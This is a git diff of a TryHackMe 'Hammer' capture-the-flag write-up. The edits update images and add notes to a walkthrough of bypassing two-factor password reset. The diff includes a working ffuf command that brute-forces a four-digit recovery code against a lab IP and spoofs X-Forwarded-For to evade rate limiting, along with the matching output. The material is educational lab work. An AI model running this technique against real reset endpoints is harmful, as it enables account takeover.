@@ -1,4 +1,6 @@
-![image](https://github.com/user-attachments/assets/a62eb657-164c-465e-91ac-98159cbfb185)# THM-Hammer
+![image](https://github.com/user-attachments/assets/05fe257f-b4ab-4dde-986d-edb60916c432)
+
+# THM-Hammer
 Hammer is a medium rate challenge. I'll start with directory enumeration on a web server, where a legitimate username can be found. After that, I will bypass 2fa mechanisism that is required to reset the user's password. 
 
 <h2>${\color{Blue}Recon}$</h2>
@@ -94,9 +96,13 @@ To generate the wordlist, I'll use the seq command with padding options.
 seq -w 9999 > code.txt
 ```
 
-ffuf is used again to brute-force the 2FA token.
+ffuf is used again to brute-force the 2FA token. Here I filtered for empty responses and responses contains "Invalid" keyword, as shown when an invalid token is submitted.
 
-```root@ip-10-10-248-70:~# ffuf -w code.txt -u http://10.10.81.149:1337/reset_password.php -X POST -d 'recovery_code=FUZZ&s=120' -H 'Content-Type: application/x-www-form-urlencoded' -H "X-Forwarded-For:FUZZ" -H "Cookie:PHPSESSID=so7dmfev7f9c73um8h5f1b1hen" -fr "Invalid" -fs 0
+![image](https://github.com/user-attachments/assets/91a4b2e6-9614-4577-99fe-842070abbc4d)
+
+
+```
+root@ip-10-10-248-70:~# ffuf -w code.txt -u http://10.10.81.149:1337/reset_password.php -X POST -d 'recovery_code=FUZZ&s=120' -H 'Content-Type: application/x-www-form-urlencoded' -H "X-Forwarded-For:FUZZ" -H "Cookie:PHPSESSID=so7dmfev7f9c73um8h5f1b1hen" -fr "Invalid" -fs 0
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -127,7 +133,10 @@ ________________________________________________
 8610                    [Status: 200, Size: 2191, Words: 595, Lines: 53]
 ```
 
+<i> Note: The cookie is different from the one captured with Burp because when the rate limit expired, I was given a new session.</i>
+
 Once the correct token is submitted, I resetted the password and successfully logged in.
+
 ![image](https://github.com/user-attachments/assets/d9267f3d-1cf0-4056-a99b-5fbde3944a47)
 
 
